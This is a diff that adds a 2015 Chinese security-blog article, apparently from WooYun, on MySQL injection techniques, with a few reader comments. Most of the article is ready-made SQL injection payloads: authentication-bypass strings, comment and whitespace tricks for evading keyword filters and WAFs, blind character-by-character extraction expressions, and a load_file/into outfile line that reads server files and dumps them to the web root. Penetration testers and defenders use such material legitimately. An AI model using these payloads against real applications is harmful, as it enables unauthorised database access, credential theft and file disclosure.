@@ -1,0 +1,122 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">MySQL注入技巧</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Utopia</a> <span class="bull">·</span> <time title="2015/07/22 10:39" ui-time="" datetime="2015/07/22 10:39" class="published ng-binding ng-isolate-scope">2015/07/22 10:39</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>原文地址：http://websec.files.wordpress.com/2010/11/sqli2.pdf</p><h1>0x00、介绍</h1><hr><p>也可以参考瞌腄龙的mysql注入科普：http://drops.wooyun.org/tips/123</p><p>很多东西都是一样的，但是有一些小技巧确实很使用。</p><p>以下所有技巧都只在mysql适用，因为它太灵活了</p><h1>0x01 MYSQl灵活的语法</h1><hr><p><strong>1 MySQL语法以及认证绕过</strong></p><p>注释符：</p><pre><code>#， 
+-- X(X为任意字符)
+/*(MySQL-5.1)
+;%00
+`
+'or 1=1;%00
+'or 1=1 union select 1,2`'
+'or 1=1 #
+'/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138
+'/*!or*/ 1=1 -- -
+</code></pre><p>前缀：</p><p>任意混合 <code>+ - ~ !</code></p><pre><code>'or --+2=- -!!!'2
+</code></pre><p>测试后发现<code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略</p><pre><code>'or- -!!!1=1；
+</code></pre><p>运算符：</p><pre><code>^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, &lt;, &gt;, &lt;&lt;, &gt;&gt;, &gt;=, &lt;=, &lt;&gt;, &lt;=&gt;, XOR,DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN,……
+
+'or 1 rlike '1
+</code></pre><p>空格替换：<code>%20, %09, %0a, %0b, %0c, %0d, %a0</code></p><p>也可以插入括号，前缀，操作符，引号</p><pre><code>'or+(1)sounds/**/like"1"--%a0-
+</code></pre><p>字符串格式</p><pre><code>    ' or "a"='a'
+    ' or 'a'=n'a'               //unicode
+    ' or 'a'=b'1100001'         //binary
+    ' or 'a'=_binary'1100001'   //5.5.41下测试无效
+    ' or 'a'=x'61'              //16进制
+</code></pre><p><strong>2、MySQL常用的一些小工具</strong></p><p>常量：<code>true， false， null， \N, current_timestamp....</code></p><p>变量：<code>@myvar:=1</code></p><p>系统变量：<code>@@version, @@datadir....</code></p><p>常用函数：<code>version(), pi(), pow(), char(), substring()....</code></p><p><strong>3、MySQL类型转换</strong></p><pre><code>' or 1=true #true=1, false=0
+' or 1 #true
+' or version()=5.5 #5.5.41-log
+
+' or round(pi(),1)+true+true+0.4=version() #3.1+1+1+0.4
+
+select * from users where 'a'='b'='c'
+select * from users where ('a'='b')='c'
+select * from users where (false)='c'
+select * from users where (0)='c'
+select * from users where (0)=0
+select * from users where true
+select * from users
+</code></pre><p>以上的语句都是同样的效果</p><p><strong>4、认证绕过</strong></p><p>绕过语句：<code>'='</code></p><pre><code>select data from users where name="="
+select data from users where flase=" 
+select data from users where 0=0
+</code></pre><p>绕过语句：<code>'-'</code></p><pre><code>select data from users where name=''-''
+select data from users where name=0-0
+select data from users where 0=0
+</code></pre><h1>0x02 关键字过滤</h1><hr><p>空格</p><p>过滤代码<code>/\s/</code></p><pre><code>%20, %09, %0a, %0b, %0c, %0d, %a0
+</code></pre><p>关键字<code>OR，AND</code></p><p>过滤代码<code>/\sor\s/i,/\sand\s/i</code></p><pre><code>'||1='1     #or
+'='
+'&amp;&amp;1='1     #and
+</code></pre><p>关键字<code>union select</code></p><p>过滤代码<code>/union\s+select/i</code></p><pre><code>'and(true)like(false)union(select(pass)from(users))#
+'union [all|distinct] select pass from users#
+'union%a0select pass from users#
+'union/*!select*/pass from users#
+/vuln.php?id=1 union/*&amp;sort=*/select pass from users-- -
+</code></pre><p>如果单独过滤union,使用盲注来获取数据</p><pre><code>'and(select pass from users limit 1)='secret
+</code></pre><p>通过子查询获取单值来进行比较</p><p>关键字<code>limit</code></p><p>过滤代码<code>/limit/i</code></p><pre><code>'and(select pass from users where id=1)='a
+'and(select pass from users group by id having id=1)='a
+'and length((select pass from users having substr(pass,1,1)='a'))
+</code></pre><p>关键字<code>having</code></p><p>过滤代码<code>/having/i</code></p><pre><code>'and(select substr(group_concat(pass),1,1)from users)='a
+</code></pre><p>关键字<code>select ... from</code></p><p>过滤代码<code>/SELECT\s+[A-Za-z.]+\s+FROM/i/i</code></p><pre><code>select [all|distinct] pass from users
+select`table_name`from`information_schema` . `tables`
+select pass as alias from users
+select pass aliasalias from users
+select pass`alias alias`from users
+select+pass%a0from(users)
+</code></pre><p>关键字<code>select</code></p><p>过滤代码<code>/select/i</code></p><h3>1 有文件读取权限</h3><pre><code>' and substr(load_file('file'),locate('DocumentRoot',(load_file('file')))+
+length('DocumentRoot'),10)='a'='' into outfile '/var/www/dump.txt
+</code></pre><h3>2 获取列名</h3><pre><code>' and 列名 is not null#
+' procedure analyse()#
+</code></pre><p>使用substr来做过滤条件</p><pre><code>'and substr(pass,1,1)='a
+</code></pre><p>关键字<code>select,and,&amp;</code></p><p>'0#</p><pre><code>select data from users where name = ''-0 # int typecast
+select data from users where name = 0 # int typecast
+select data from users where 0 = 0 # true
+</code></pre><p>'-1#</p><pre><code>select data from users where 0 = -1 # false
+</code></pre><p>使用条件判断来进行<code>true、false</code>的选择</p><pre><code>    ifnull(nullif()), case when， if()
+    '-if(name='Admin',1,0)#
+</code></pre><p>使用嵌套条件<code>'-if(</code></p><pre><code>if(name='Admin',1,0), // condition
+if(substr(pass,1,1)='a',1,0) // if true
+,0)# // if false    
+</code></pre><h1>0x03 函数过滤</h1><hr><p>构建字符串相关函数</p><pre><code>unhex char hex ascii ord substr substring mid pad left right insert
+' and substr(data,1,1) = 'a'#
+' and substr(data,1,1) = 0x61# 0x6162
+' and substr(data,1,1) = unhex(61)# unhex(6162)
+' and substr(data,1,1) = char(97)# char(97,98)
+' and hex(substr(data,1,1)) = 61#
+' and ascii(substr(data,1,1)) = 97#
+' and ord(substr(data,1,1)) = 97#
+</code></pre><p>使用conv来进行进制的转换</p><pre><code>' and substr(data,1,1) = lower(conv(10,10,36))# 'a'
+' and substr(data,1,1) = lower(conv(11,10,36))# 'b'
+' and substr(data,1,1) = lower(conv(36,10,36))# 'z'
+</code></pre><p>使用函数来猜解数据</p><pre><code>' and substr(data,1,1) = 'a'#
+' and substring(data,1,1) = 'a'#
+' and mid(data,1,1) = 'a'#
+</code></pre><p>不适用逗号来获取</p><pre><code>' and substr(data from 1 for 1) = 'a'#
+</code></pre><p>同样也可以使用一下比较少见的函数来尝试绕过</p><pre><code>lpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'
+rpad(data,1,space(1)) // rpad('hi',4,'?') = 'hi??'
+left(data,1)
+reverse(right(reverse(data),1))
+insert(insert(version(),1,0,space(0)),2,222,space(0))
+</code></pre><p>有些函数有类似搜索匹配的功能</p><pre><code>'-if(locate('f',data),1,0)#
+'-if(locate('fo',data),1,0)#
+'-if(locate('foo',data),1,0)#
+instr(), position()
+</code></pre><p>使用函数进行字符串的切割</p><pre><code>length(trim(leading 'a' FROM data)) # length will be shorter
+length(replace(data, 'a', '')) # length will be shorter
+</code></pre><p>2种方式都是相同效果</p><h1>0x04 注入时主要使用的一些东西</h1><hr><pre><code>1个控制流程操作(select, case, if(), ...)
+1个比较操作(=, like, mod(), ...)
+1个字符串的猜解(mid(), left(), rpad(), …)
+1个字符串生成(0x61, hex(), conv())
+</code></pre><p>使用<code>conv([10-36],10,36)</code>可以实现所有字符的表示</p><pre><code>false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K
+true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L
+true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M
+floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N
+ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O
+floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P
+ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q
+ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R
+floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S
+floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T
+</code></pre><p>更多详细的东西可以参考原文去了解，还有一些其他的注入资料可以参考</p><pre><code>http://www.ptsecurity.com/download/PT-devteev-CC-WAF-ENG.pdf
+
+https://media.blackhat.com/bh-us-12/Briefings/Ristic/BH_US_12_Ristic_Protocol_Level_Slides.pdf
+
+http://www.blackhatlibrary.net/SQL_injection
+
+http://websec.ca/kb/sql_injection
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">he1renyagao</span> <span class="reply-time">2015-07-25 12:55:59</span></div><p></p><p>@园长 还有在整waf？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2015-07-24 12:26:11</span></div><p></p><p>记下来，有用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Utopia</span> <span class="reply-time">2015-07-22 13:49:59</span></div><p></p><p>@mickey ~、！、没有测试太多，规律也不同，主要不清楚他的原理是什么，这个还需要再查下资料才能下定论，！这个不止有3-4个可以有很多，混用可以中间穿插着空格来使用例如~ ~！！！， 前后顺序一样是因为等于号，这里也是给大家抛出这一个点，所以没有做的很详细！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mieless</span> <span class="reply-time">2015-07-22 11:50:49</span></div><p></p><p>666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2015-07-22 11:04:58</span></div><p></p><p>good job</p><p></p></div></div></div></div></div></main>
